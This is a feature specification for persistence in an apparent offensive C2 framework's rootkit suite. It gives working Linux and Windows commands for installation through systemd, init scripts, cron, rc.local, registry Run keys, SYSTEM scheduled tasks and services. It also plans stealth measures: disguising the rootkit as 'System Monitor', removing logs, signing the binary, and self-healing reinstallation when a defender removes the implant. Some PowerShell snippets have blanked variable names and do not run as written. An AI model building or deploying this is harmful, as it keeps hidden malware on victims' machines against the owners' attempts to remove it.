# F0204: Rootkit Persistence

## Metadata
| Field | Value |
|---|---|
| ID | F0204 |
| Priority | v2 |
| Status | Planned |
| MVP Phase | v2 |
| Depends on | F0015, F0200, F0201, F0202, F0203 |

## Summary
Persistence mechanisms for rootkit suite ensuring survival across system reboots. Supports multiple persistence methods for Linux (init scripts, systemd services, cron, rc.local) and Windows (registry run keys, scheduled tasks, services, WMI subscriptions). Configurable via Xero UI with automatic installation during rootkit deployment.

## Requirements
- Linux: init scripts, systemd, cron, rc.local, upstart (legacy)
- Windows: Registry Run keys, Scheduled Tasks, Services, WMI
- Configurable trigger conditions (boot, user login, time-based)
- Stealth installation (hidden services, signed tasks)
- Self-healing (reinstall if removed)
- Remote enable/disable via C2

## Linux Persistence Methods

### Systemd Service (Modern Linux)
`ini
# /etc/systemd/system/rootkit.service
[Unit]
Description=System Monitor
After=network.target

[Service]
Type=forking
ExecStart=/usr/bin/rootkit-daemon start
ExecStop=/usr/bin/rootkit-daemon stop
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
`

**Installation:**
`ash
cp rootkit.service /etc/systemd/system/
systemctl daemon-reload
systemctl enable rootkit.service
systemctl start rootkit.service
`

### Init Script (SysVinit)
`ash
# /etc/init.d/rootkit
#!/bin/bash
case "" in
  start) /usr/bin/rootkit-daemon start ;;
  stop)  /usr/bin/rootkit-daemon stop ;;
  restart) /usr/bin/rootkit-daemon restart ;;
esac
`

**Installation:**
`ash
cp rootkit /etc/init.d/
chmod +x /etc/init.d/rootkit
update-rc.d rootkit defaults  # Debian/Ubuntu
chkconfig --add rootkit        # RHEL/CentOS
`

### Cron Job
`crontab
# /etc/cron.d/rootkit
@reboot /usr/bin/rootkit-daemon start
*/5 * * * * /usr/bin/rootkit-daemon check  # Self-healing
`

### rc.local
`ash
# /etc/rc.local
/usr/bin/rootkit-daemon start >/dev/null 2>&1 &
`

## Windows Persistence Methods

### Registry Run Keys
`powershell
# Current User
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
  -Name "SystemMonitor" -Value "C:\Windows\system32\rootkit.exe"

# Local Machine
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
  -Name "SystemMonitor" -Value "C:\Windows\system32\rootkit.exe"
`

### Scheduled Task
`powershell
 = New-ScheduledTaskAction -Execute "C:\Windows\system32\rootkit.exe"
 = New-ScheduledTaskTrigger -AtStartup
 = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "SystemMonitor" -Action  -Trigger  -Principal
`

### Windows Service
`powershell
# Using sc.exe or PowerShell
sc create RootKit binPath= "C:\Windows\system32\rootkit.exe --service" start= auto
sc start RootKit
`

### WMI Subscription
`powershell
# Event-based activation via WMI
# Triggers on system startup or specific events
`

## Persistence Configuration

`json
{
  "platform": "linux",
  "methods": ["systemd", "cron"],
  "config": {
    "systemd": {
      "service_name": "system-monitor",
      "description": "System Performance Monitor",
      "user": "root",
      "hidden": true
    },
    "cron": {
      "self_heal_interval": 300
    }
  },
  "self_healing": true,
  "boot_delay_seconds": 30
}
`

## Self-Healing Mechanism

### Linux
`ash
# /usr/bin/rootkit-selfheal
#!/bin/bash
if ! pgrep -x "rootkit-daemon" > /dev/null; then
  /usr/bin/rootkit-daemon start
fi

if ! systemctl is-active --quiet system-monitor 2>/dev/null; then
  systemctl start system-monitor
fi
`

### Windows
`powershell
# Scheduled task runs every 5 minutes
if (-not (Get-Process -Name "rootkit" -ErrorAction SilentlyContinue)) {
  Start-Process "C:\Windows\system32\rootkit.exe"
}
`

## Stealth Techniques

### Linux
- Mask service name as common system service
- Hide process via rootkit (F0201/F0202)
- Remove log entries
- Use existing user context

### Windows
- Use strongly typed task names
- Sign executable with valid certificate
- Masquerade as Windows process name
- Use COM hijacking (advanced)

## Installation Workflow

`
1. Rootkit payload delivered to target
2. Persistence config parsed from payload
3. Select appropriate method for platform
4. Install persistence mechanism
5. Verify installation
6. Enable self-healing if configured
7. Report success to C2
`

## Removal/Cleanup

### Linux
`ash
systemctl stop system-monitor
systemctl disable system-monitor
rm /etc/systemd/system/system-monitor.service
systemctl daemon-reload
rm /etc/cron.d/rootkit
rm /usr/bin/rootkit-daemon
`

### Windows
`powershell
sc stop RootKit
sc delete RootKit
Unregister-ScheduledTask -TaskName "SystemMonitor" -Confirm:False
Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemMonitor"
`

## Stages

### Stage 1: Linux Persistence
**Goal:** Implement Linux persistence methods.
**Acceptance Criteria:**
- [ ] Systemd service installation/removal
- [ ] Init script installation/removal
- [ ] Cron job installation/removal
- [ ] Persistence survives reboot

### Stage 2: Windows Persistence
**Goal:** Implement Windows persistence methods.
**Acceptance Criteria:**
- [ ] Registry Run key installation/removal
- [ ] Scheduled Task installation/removal
- [ ] Service installation/removal
- [ ] Persistence survives reboot

### Stage 3: Self-Healing
**Goal:** Implement self-healing mechanisms.
**Acceptance Criteria:**
- [ ] Auto-restart if process killed
- [ ] Reinstall if persistence removed
- [ ] Configurable heal interval

### Stage 4: UI Integration
**Goal:** Persistence configuration in Xero UI.
**Acceptance Criteria:**
- [ ] Persistence options in rootkit builder
- [ ] View active persistence on beacons
- [ ] Enable/disable persistence remotely

## Feature Acceptance Criteria

- [ ] All Linux persistence methods work on Ubuntu/CentOS
- [ ] All Windows persistence methods work on Win10/Win11
- [ ] Persistence survives system reboot
- [ ] Self-healing restores rootkit after removal attempt
- [ ] UI shows and manages persistence state

## Test Plan

### Unit Tests
- [ ] test_systemd_install_uninstall
- [ ] test_registry_key_install_uninstall
- [ ] test_scheduled_task_install_uninstall
- [ ] test_self_heal_trigger

### System / Integration Tests
- [ ] Install persistence; reboot; verify rootkit running
- [ ] Kill rootkit process; verify self-heal restarts
- [ ] Remove persistence mechanism; verify reinstallation
- [ ] Test on multiple Linux distributions
- [ ] Test on Windows 10 and 11

### Playwright Tests
- [ ] Rootkit builder shows persistence options
- [ ] Select persistence method; generate payload
- [ ] View persistence status on beacon detail

## Related Features

- **Overview:** [F0200](0200-rootkit-suite-overview.md)
- **Linux LKM:** [F0201](0201-linux-lkm-rootkit.md)
- **Linux eBPF:** [F0202](0202-linux-ebpf-rootkit.md)
- **Windows:** [F0203](0203-windows-rootkit.md)
- **Communication:** [F0205](0205-rootkit-communication.md)
